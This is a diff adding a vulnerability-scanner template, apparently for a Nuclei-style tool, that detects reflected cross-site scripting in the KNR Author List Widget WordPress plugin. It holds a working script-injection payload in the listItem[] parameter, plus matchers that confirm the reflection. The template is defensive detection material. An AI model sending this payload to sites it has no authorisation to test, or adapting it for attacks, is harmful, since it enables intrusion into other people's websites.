@@ -1,0 +1,38 @@
+id: "knr-widget-xss"
+name: "KNR Author List Widget - Cross-site Scripting"
+severity: "medium"
+description: "KNR Author List Widget suffers from Cross-site Scripting (XSS) in the listItem[] parameter."
+tech:
+  - "wordpress"
+  - "php"
+tags:
+  - "xss"
+  - "knr-author-list-widget"
+  - "wordpress"
+  - "wp"
+  - "wp-plugin"
+  - "vuln"
+cwe: "CWE-80"
+reference: "https://wordpress.org/plugins/knr-author-list-widget/"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/wp-content/plugins/knr-author-list-widget/knrAuthorListCustomSortSave.php?listItem[]=<script>alert(document.domain)</script>"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "item: <script>alert(document.domain)</script>"
+      - "Saved on"
+    condition: "and"
+  - type: "word"
+    part: "header"
+    words:
+      - "text/html"
+  - type: "status"
+    status:
+      - 200
